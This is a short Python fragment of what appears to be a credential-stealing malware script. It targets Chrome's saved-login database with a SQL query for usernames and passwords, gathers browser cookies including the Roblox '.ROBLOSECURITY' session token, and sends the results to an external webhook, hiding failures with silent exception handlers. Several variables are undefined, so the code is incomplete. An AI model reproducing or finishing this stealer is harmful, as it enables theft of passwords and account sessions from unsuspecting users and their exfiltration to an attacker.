profile = r'Google\Chrome\User Data\Default\Login Data'
query = 'select signon_realm,username_value,password_value from logins'
def collect():
    hook = Webhook(url)
    cookie = ['.ROBLOSECURITY']
    cookies = []
    try:
        cookies.extend(list(browser.chrome()))
    except Exception:
        pass
    try:
        embed = Embed()
        embed.add_field('roblosecurity:', roblox)
    except Exception:
        pass
    try:
        hook.send(embed=embed, file=passwords)
    except Exception:
        pass
